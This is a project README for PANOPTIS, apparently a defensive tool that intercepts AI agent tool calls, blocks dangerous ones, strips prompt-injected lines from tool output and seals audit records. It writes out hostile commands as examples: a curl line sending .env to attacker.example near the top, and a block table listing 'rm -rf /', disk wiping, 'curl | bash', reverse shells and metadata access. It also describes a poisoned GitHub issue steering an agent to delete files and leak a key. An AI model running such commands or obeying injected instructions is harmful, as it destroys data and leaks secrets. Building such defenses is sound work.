<div align="center">

<img width="120" height="120" alt="Panoptis logo" src="https://github.com/user-attachments/assets/4e6fd818-2458-4ac2-bb9c-25542622dd00" />

# PANOPTIS

### Decide on agent tool calls before they run.
**Runtime enforcement and tamper-evident records for autonomous agents.** *(formerly AgentWatch)*

*Covers calls routed through a supported enforcing integration. It is not a sandbox: [see the limits](#-what-panoptis-does-not-do).*

[![PyPI](https://img.shields.io/pypi/v/panoptis?style=flat-square&color=2a6fdb)](https://pypi.org/project/panoptis/) [![Python 3.12](https://img.shields.io/badge/python-3.12-2a6fdb?style=flat-square&logo=python&logoColor=white)](https://python.org) [![License](https://img.shields.io/badge/license-Apache_2.0-2a6fdb?style=flat-square)](LICENSE) [![Discord](https://img.shields.io/badge/Discord-join-5865F2?style=flat-square&logo=discord&logoColor=white)](https://discord.gg/UT9uaeY46e) [![Stars](https://img.shields.io/github/stars/Shinraya-Tech-Labs/AgentWatch?style=flat-square&color=d9730d)](https://github.com/Shinraya-Tech-Labs/AgentWatch/stargazers) [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/Shinraya-Tech-Labs/AgentWatch/blob/main/examples/quickstart_panopti_guardrails.ipynb)

<br/>

<img src="docs/images/readme/hero.png" alt="An agent proposes four things. rm -rf / is blocked and never runs. git push --force asks a human and runs once after approval. ls -la is allowed. An injected line in tool output is removed before the agent reads it." width="760"/>

<br/>

[**Try it**](#-try-it-in-60-seconds) · [**Live demo**](#-see-an-attack-stopped) · [**How it works**](#-how-it-works) · [**Pipeline**](#-the-decision-pipeline) · [**Evidence**](#-evidence-you-can-verify) · [**Benchmarks**](#-benchmarks) · [**Integrations**](#-integrations) · [**Dashboard**](#-dashboard) · [**Roadmap**](#-target-architecture)

</div>

---

## ⚡ Why this exists

```text
Task:     "Clean up the cache and sync the database"
Reasoning looks confident and well structured.
Action:   DROP TABLE users; curl -X POST attacker.example -d @.env
```

Logs and traces tell you this happened. They arrive after the table is gone.

An agent acts with its user's privileges while taking direction from whatever it reads, so a poisoned web page, issue or tool result can steer it. PANOPTIS sits between the agent and its tools. For each call routed through an enforcing integration, it decides before the call runs, checks the result before the agent reads it, and can keep tamper-evident records.

| | Tracing and logging | PANOPTIS |
|---|---|---|
| **When it acts** | After the tool ran | Before the tool runs, and again on its output |
| **A dangerous call** | Recorded | Blocked, or held for a human |
| **Injected tool output** | Recorded | Quarantined before the agent reads it |
| **Audit trail** | Mutable logs | Append-only and Merkle-sealed; tamper-evident against a head held outside the store |

---

## 🚀 Try it in 60 seconds

Requires Python 3.12.

```bash
pip install panoptis
panopti playground    # local browser playground
panopti demo          # scripted illustration only: no database, no real pipeline
```

Wrap any Python function:

```python
from panoptis.protect import ActionBlocked, protect_tool

@protect_tool
def execute_system_query(query: str) -> str:
    return db.execute(query)  # never reached for a blocked call

try:
    execute_system_query("DROP TABLE users;")
except ActionBlocked as blocked:
    print(blocked)
```

```text
execute_system_query: block: [threat:SQL_DROP] DROP TABLE
```

Injected instructions in a tool's result never reach the agent, and the rest of the result is kept:

```text
Release notes.
[AGENTWATCH: removed a line containing instructions addressed to the model (60 chars)]
Version 2 adds caching.
```

---

## 🎬 See an attack stopped

A scripted agent reads a poisoned GitHub issue, twice. Without PANOPTIS, it really deletes a throwaway project and sends a fake key to a local "attacker" server. With PANOPTIS, the same attack fails. The demo then shows human approval, MCP interception, a cross-process emergency stop, tamper detection and tenant isolation, checking its own outcome at every step.

```bash
python examples/walkthrough/live_demo.py
```

<p align="center">
  <img src="examples/walkthrough/output/live-demo/screenshots/terminal.png" alt="Terminal transcript of the live demo: the unprotected attack succeeds, the same attack is blocked, and a scoreboard shows every check passing." width="760"/>
</p>

No model, API key or external network is needed. Everything is local and runs from a clone. The agent is scripted so the demo is repeatable; the API, pipeline, MCP gateway, evidence store and verifier are the real product. [Presenter guide](examples/walkthrough/README.md#live-demo) · [recorded run](examples/walkthrough/output/live-demo/)

---

## 💡 How it works

**One boundary, four steps, shared by every enforcing integration.**

<p align="center">
  <img src="docs/images/readme/how-it-works.png" alt="An agent proposes a tool call. Inside the enforcement boundary it is decided, run at most once, inspected and recorded. A denied call goes to blocked and the tool never runs. The tool talks to the outside world only in the run step, and the sanitized result returns to the agent." width="760"/>
</p>

PANOPTIS has two planes. The **enforcement plane** (`panoptis.protect`) makes the decisions. The **evidence plane** (the v3 Evidence Lab) is passive: it records, seals, compares and replays, and stops nothing.

<p align="center">
  <img src="docs/images/readme/architecture.png" alt="Enforcing integrations (Python SDK, frameworks, Claude Code, MCP gateway) feed the enforcement plane of pipeline, approvals, emergency stop and output checks. It writes records to the evidence plane of store, Merkle seals, replay and verifier. Both use a shared REST API, dashboard, CLI and storage." width="760"/>
</p>

---

## 🔐 The decision pipeline

**A blocked call never runs, and a failure inside the pipeline blocks too.**

<p align="center">
  <img src="docs/images/readme/decision-pipeline.png" alt="Ten steps in order: identity, control, threat analysis, RBAC, loops, intent, human approval when escalated, final stop check, run, inspect output. A block in steps one to six, a denied approval or a tripped stop ends in refused, and the tool body never runs. An unsafe result is withheld or sanitized. Opt-in stages are off by default." width="760"/>
</p>

### Stopped by default

Each row was run through the default pipeline.

| Category | Example | Result |
|---|---|---|
| Destructive files and disks | `rm -rf /` · `chmod -R 777 /` · `dd if=/dev/zero of=/dev/sda` | Blocked |
| Remote code execution | `curl … \| bash` · `wget -O- … \| sh` · reverse shells | Blocked |
| Database destruction | `DROP DATABASE` · `DELETE` with no `WHERE` | Blocked |
| Cloud metadata access | `http://169.254.169.254/…` | Blocked |
| Private network access | `127.0.0.1` · RFC 1918 addresses | Escalated; blocked with no approval channel |
| Injected tool output | Instruction lines in a result | Quarantined |

> [!NOTE]
> These are pattern and parser rules, so they catch known forms. Novel encodings and paraphrased injections can evade them. Read [what PANOPTIS does not do](#-what-panoptis-does-not-do).

---

## 🌲 Evidence you can verify

**Sealed evidence is tamper-evident: a verifier that does not need PANOPTIS detects edits and reordering, and detects truncation when it holds a head from outside the store.**

<p align="center">
  <img src="docs/images/readme/evidence.png" alt="Records are sealed every 200 records or 30 seconds per tenant into hash-chained Merkle segments. The head is anchored outside the store. A standalone verifier takes an exported bundle and the expected head and reports intact, or fails if evidence was edited, reordered or truncated." width="760"/>
</p>

```python
from panoptis.protect import ProtectionPipeline, ProtectLedger, protect_tool

pipeline = ProtectionPipeline(ledger=ProtectLedger("sqlite:///evidence.db"))

@protect_tool(tool="bash", pipeline=pipeline, agent_id="coder", session_id="run-1")
def bash(command: str) -> str: ...
```

```bash
panoptis protect evidence verify --store sqlite:///evidence.db
```

- **Domain-separated Merkle trees** prefix leaves with `0x00` and branches with `0x01`.
- **Crypto-shredding** encrypts subject payloads with AES-256-GCM over committed ciphertext, so erasing a key leaves the proofs valid. Needs `panoptis[crypto]`.
- **Attestation tokens** are signed with HMAC-SHA256 or Ed25519.

> [!IMPORTANT]
> Evidence is written only when a ledger is configured. Records are integrity-protected once sealed. The guarantee is relative to a trusted anchor: whoever controls both the store and the anchor can rewrite history, so keep the head with a second party. Evidence shows what was recorded, not that nothing else happened. See [docs/EVIDENCE_INTEGRITY.md](docs/EVIDENCE_INTEGRITY.md).

### Shadow replay

**Replay a recorded run against a new model without touching the real world.** Every tool call is answered from evidence, and the traces are compared.

<p align="center">
  <img src="docs/images/readme/shadow-replay.png" alt="A replay runner sends each recorded step to the model under test. Its tool actions are answered from recorded evidence and the real world is never contacted. The traces are compared and classified as identical replay, failure reproduced, model diverged, or not enough evidence." width="760"/>
</p>

---

## 📊 Benchmarks

**In-process with a no-op tool, a decision took about 0.4 ms at the median, or about 3 ms with durable SQLite evidence, on the measured machine.** Runs vary with machine load.

<p align="center">
  <img src="docs/images/readme/benchmark-latency.png" alt="Latency per path on a log axis, for the paths in the table below." width="760"/>
</p>

| Path | p50, no evidence | p99, no evidence | p50, SQLite | p99, SQLite |
|---|---:|---:|---:|---:|
| Allow | 0.37 ms | 0.63 ms | 2.96 ms | 13.52 ms |
| Block | 0.45 ms | 0.72 ms | 3.26 ms | 12.29 ms |
| Rewrite arguments | 0.41 ms | 0.72 ms | 3.49 ms | 17.50 ms |
| Sanitize output | 0.33 ms | 0.75 ms | 2.81 ms | 21.64 ms |
| Approved escalation | 0.70 ms | 0.94 ms | 11.98 ms | 27.89 ms |

Throughput was about 1,500–1,600 decisions per second in one process, across 1, 4 and 8 threads. Disk writes dominate the SQLite tail.

### Synthetic regression corpus

These are regression results on a project-written corpus, not a measure of attack coverage.

| Threat category | Attacks | Benign controls | Detected | False positives | Outcome |
|---|---:|---:|---:|---:|---|
| Dangerous tool arguments | 24 | 12 | 24 | 0 | Blocked |
| Secret exposure | 4 | 2 | 4 | 0 | Half blocked, half redacted |
| Prompt injection in tool output | 7 | 5 | 7 | 0 | Sanitized; legitimate content kept |
| Policy violations (RBAC) | 6 | 3 | 6 | 0 | Blocked |
| Loops | 4 | 3 | 4 | 0 | Escalated |
| Intent mismatch | 7 | 5 | 7 | 0 | Escalated |

All integrations agree on dangerous arguments: pipeline, `protect_tool`, MCP gateway, and the 19 attack cases expressible through the Claude Code hook contract.

> [!WARNING]
> **Read these numbers with care.** The corpus is 82 synthetic cases written by this project, and two real defects it found were fixed before this run. A perfect score shows the rules handle these cases, not that unseen attacks are caught. No external dataset or competitor comparison is involved.

Measured on a development tree based on commit `9627068`, before the final erasure, trajectory and workspace-snapshot changes (none is on these measured paths), on Python 3.12.4, Windows 11, AMD64 with 16 logical CPUs, in-process with a no-op tool. [Full report](benchmarks/results/protect_eval/REPORT.md) · [method](docs/EVALUATION.md) · [raw results](benchmarks/results/protect_eval/results.json)

```bash
python -m benchmarks.protect_eval.run --out benchmarks/results/protect_eval --iterations 300
```

---

## 🔌 Integrations

An integration either **enforces** before a tool runs or only **observes** afterwards. `panoptis protect support` prints the full matrix, and [docs/ADAPTER_SUPPORT.md](docs/ADAPTER_SUPPORT.md) lists every limitation.

| Integration | Mode | Entry point | Main limit |
|---|---|---|---|
| Any Python function | 🛡️ Enforces | `protect_tool()` | Only calls made through the wrapper |
| Generic agents | 🛡️ Enforces | `watch(agent, protection=...)` | Only tool-like methods |
| LangChain tools | 🛡️ Enforces | `protect_langchain_tool` | Tools must be wrapped before the agent runs them |
| LangGraph | 🛡️ Enforces | `protect_langgraph_tool_node` | Tools called outside a `ToolNode` are not covered |
| AutoGen 0.4+ | 🛡️ Enforces | `protect_autogen_tool` | Tool calls only |
| smolagents | 🛡️ Enforces | `protect_smolagents_agent` | `CodeAgent`'s interpreter is not a tool call |
| Claude Code | 🛡️ Enforces | `panoptis protect claude-hook install --on-failure-block` | **Fails open before Claude Code 2.1.295**; real-CLI test not run |
| MCP servers | 🛡️ Enforces | `panoptis protect mcp-gateway` | Only clients routed through the gateway |
| CrewAI, OpenAI Agents SDK, AutoGPT, OpenClaw | 👁️ Observes | `panoptis.adapters` | Records events; stops nothing |
| Framework callback adapters, CLI agents | 👁️ Observes | `panoptis.adapters` | Records events; stops nothing |

> [!WARNING]
> **Claude Code:** on versions before 2.1.295, a hook that fails to start or times out lets the tool run. Fail-closed behaviour needs Claude Code 2.1.295 or later with `--on-failure-block`. The hook contract is tested, but it has not been run end to end against a real signed-in CLI on any version. See [docs/CLAUDE_CODE_HOOK.md](docs/CLAUDE_CODE_HOOK.md).

Runtime setup is in [`docs/adapters/`](docs/adapters/). `panoptis protect discover` finds local agents and MCP servers and reports which are monitored.

---

## 🖥️ Dashboard

Real screens from the security dashboard, driven by real pipeline decisions in the [browser test suite](tests/e2e_dashboard/).

<table>
  <tr>
    <td width="50%" valign="top"><img src="docs/screenshots/dashboard/01-overview-acme.png" alt="Security overview for one tenant"/><br/><sub><b>Overview.</b> Verdicts and recent decisions for one tenant.</sub></td>
    <td width="50%" valign="top"><img src="docs/screenshots/dashboard/02-decisions-blocked-detail.png" alt="Detail of a blocked decision"/><br/><sub><b>Decisions.</b> Why a call was blocked, stage by stage.</sub></td>
  </tr>
  <tr>
    <td width="50%" valign="top"><img src="docs/screenshots/dashboard/03-approval-pending.png" alt="A tool call waiting for approval"/><br/><sub><b>Approvals.</b> An escalated call waits for its exact action digest to be approved.</sub></td>
    <td width="50%" valign="top"><img src="docs/screenshots/dashboard/05-emergency-stop-active.png" alt="Emergency stop active"/><br/><sub><b>Emergency stop.</b> New tool calls stop across the deployment.</sub></td>
  </tr>
</table>

---

## 🧰 Run it for real

<details open>
<summary><b>Protect an agent</b></summary>

```python
from panoptis import watch
from panoptis.protect import ProtectionPipeline

class Agent:
    def run(self, command: str) -> str:
        return f"ran {command}"

agent = watch(Agent(), session_id="prod-01", protection=ProtectionPipeline())
agent.run("ls")          # runs
agent.run("rm -rf /")    # raises ActionBlocked
```

Without `protection=`, `watch()` applies pattern rules only: no RBAC, loop, intent or approval stages, and no output sanitization.

</details>

<details>
<summary><b>Enable the opt-in stages</b></summary>

```python
from panoptis.protect import ProtectionConfig, ProtectionPipeline

pipeline = ProtectionPipeline(config=ProtectionConfig.sovereign())
```

Test this on your own workloads first. These stages are heuristic. The steganography stage strips trailing whitespace and invisible characters from tool arguments, which changes whitespace-sensitive content such as multi-line string literals; Markdown line breaks, Unicode text and emoji are preserved.

</details>

<details>
<summary><b>Start the full stack</b></summary>

```bash
git clone https://github.com/Shinraya-Tech-Labs/AgentWatch.git
cd AgentWatch
cp .env.example .env   # set AGENTWATCH_API_KEY, POSTGRES_PASSWORD and REDIS_PASSWORD
docker compose up -d
```

- **Dashboard:** `http://localhost:3000/security`
- **API docs:** `http://localhost:8000/docs`
- **Event stream:** `ws://localhost:8000/ws/events`

</details>

<details>
<summary><b>CLI reference</b></summary>

```bash
# Protection
panoptis protect check "rm -rf /"       # score a command
panoptis protect status                 # verdicts, kill switch, suspensions
panoptis protect decisions              # recent decisions
panoptis protect approvals list         # calls waiting for a person
panoptis protect control --help         # emergency stop and suspensions
panoptis protect doctor                 # diagnose the setup
panoptis protect redteam                # run simulated attacks

# Evidence
panoptis protect evidence verify        # verify chain, roots and envelopes
panoptis protect evidence export --help # export a verifiable bundle

# Forensics
panoptis observe python agent.py        # record an agent run
panoptis inspect latest                 # reconstruct what happened
panoptis compare run_A run_B            # find the first divergence
panoptis replay latest --level L2       # replay from evidence
panoptis session rollback <id>          # restore a filesystem snapshot
```

</details>

---

## 🧱 What PANOPTIS does not do

- **It is not a sandbox.** It runs in the agent's process or next to it. Use OS or container isolation against code that can modify the agent process.
- **It only sees routed calls.** A tool reached another way bypasses it, and observe-only integrations stop nothing.
- **It does not interrupt running tools.** An emergency stop blocks new calls and withdraws pending approvals.
- **It does not prove intent.** Detection is pattern-based, and intent grounding is a heuristic signal.
- **Erasure covers what the receipt names.** Each receipt lists its targets and what it did not reach, such as other processes, backups and exports. Using it does not by itself make a deployment GDPR compliant.

Full detail: [threat model](docs/THREAT_MODEL.md) · [claims and their evidence](docs/CLAIMS.md)

---

## 🧭 Target architecture

> [!IMPORTANT]
> **This is where PANOPTIS is going, not what ships today.** Execution cells, leases, label-based information flow, the temporal engine and witnessed checkpoints are design targets.

In the end state, agents run without ambient authority, every effect passes one deterministic enforcement kernel, and every decision leaves evidence anyone can verify independently.

**Agents reach the world only through the enforcement node.** Dashed borders sit outside the trusted base.

<p align="center">
  <img src="docs/images/target-architecture/system-architecture.png" alt="Target system architecture. Execution cells send Actions to the enforcement node, which holds the gateways, the sandbox supervisor, the egress proxy, the enforcement kernel, the evidence writer and the control agent. The egress proxy is the only path to the untrusted world. The control plane exchanges evidence, policy, leases and approvals with the node, and independent verifiers receive bundles and signed checkpoints." width="760"/>
</p>

<details>
<summary><b>What the component numbers mean</b></summary>

(1) agent adapters · (2) execution gateway · (3) identity and authorization · (4) policy engine · (5) temporal engine · (6) information-flow engine · (7) content inspection and advisors · (8) file, process and network sandbox · (9) approval service · (10) emergency control · (11) evidence and verification · (12) tenant-aware storage · (13) API and MCP gateway · (14) dashboard and CLI · (15) deployment and observability

</details>

<details>
<summary><b>Execution lifecycle: no effect before a durable decision</b></summary>
<br/>

Only the path down the left column releases an effect, and every failure leaves a record.

<img src="docs/images/target-architecture/execution-lifecycle.png" alt="The twelve-step lifecycle: propose, normalise, admit, authorize, evaluate state, consult advisors, combine, approve when required, record, execute, observe and verify, inspect and deliver. Failures end in one of four outcomes: refused and recorded; no grant and cell paused; killed and session halted; or result withheld." width="760"/>

Verdicts form a chain, `ALLOW` < `CONSTRAIN` < `APPROVE` < `DENY` < `HALT`, and the decision is the strictest verdict with the narrowest grant. Advisors can only tighten a decision, so a manipulated model costs availability, not security.

</details>

<details>
<summary><b>Information flow: typed, labelled values only</b></summary>
<br/>

The planner's context stays clean enough to act, and every effect it proposes still passes the flow check.

<img src="docs/images/target-architecture/context-splitting.png" alt="Untrusted content and secret data go to a quarantined worker with no effect tools. It returns a typed value, whose schema and size are checked, to the planner context. Every effect the planner proposes passes a flow check before reaching egress destinations, tools with effects or other agents." width="760"/>

</details>

<details>
<summary><b>Emergency governance: one person stops, two people resume</b></summary>
<br/>

Each scope holds one of these states, and every change raises its epoch. A node whose lease lapses behaves as stopped until a fresh lease arrives.

<img src="docs/images/target-architecture/emergency-control.png" alt="Control states: running, suspended, locked down, stopped and recovering. One person can stop from any of the first three. Resuming, lifting a lockdown and leaving stopped each take two people, and recovering returns to running once checks pass." width="760"/>

</details>

<details>
<summary><b>Deployment: one node binary everywhere</b></summary>
<br/>

<img src="docs/images/target-architecture/deployment-topologies.png" alt="Three deployments compared by layer. Workstation: OS cells, panoptisd user service, embedded control plane, SQLite. Self-hosted: OS or VM cells, a node per runner or worker, stateless API replicas, PostgreSQL and object store. Hosted multi-tenant: a VM cell per session, node pools per region, regional control planes, row-level security and per-tenant keys." width="760"/>

</details>

---

## 🧪 Quality and provenance

The Python suite recorded 3,049 passed and 12 skipped with 83% coverage in CI at commit `81e1fd1`.

```bash
pytest tests/ -v              # full suite
pytest tests/protect/ -v      # enforcement pipeline
```

Releases are built in GitHub Actions with build provenance:

```bash
pip download panoptis==0.3.1 --no-deps -d check/ && cd check
gh attestation verify panoptis-0.3.1-py3-none-any.whl --repo Shinraya-Tech-Labs/AgentWatch
```

---

## 🤝 Contributing

PANOPTIS is developed in the open, and contributors get their name on the project's contributors wall after their first merged PR.

<p align="center">
  <img src="docs/images/readme/contributing.png" alt="Five steps: discuss on Discord or in an issue, get assigned, build and test, open a PR, merged." width="760"/>
</p>

We mentor new contributors through **SSOC 2026** and **NSOC 2026**. Start with [CONTRIBUTING.md](CONTRIBUTING.md).

- **Discord:** [discord.gg/UT9uaeY46e](https://discord.gg/UT9uaeY46e)
- **Discussions:** [questions and architecture ideas](https://github.com/Shinraya-Tech-Labs/AgentWatch/discussions)
- **Security reports:** see [SECURITY.md](SECURITY.md)

---

<div align="center">

Licensed under the [Apache License 2.0](LICENSE) · Built by [**Shinraya Tech Labs**](https://github.com/Shinraya-Tech-Labs) and contributors

⭐ [**Star the repo**](https://github.com/Shinraya-Tech-Labs/AgentWatch) · 🐛 [**Report an issue**](https://github.com/Shinraya-Tech-Labs/AgentWatch/issues) · 💬 [**Join Discord**](https://discord.gg/UT9uaeY46e)

</div>
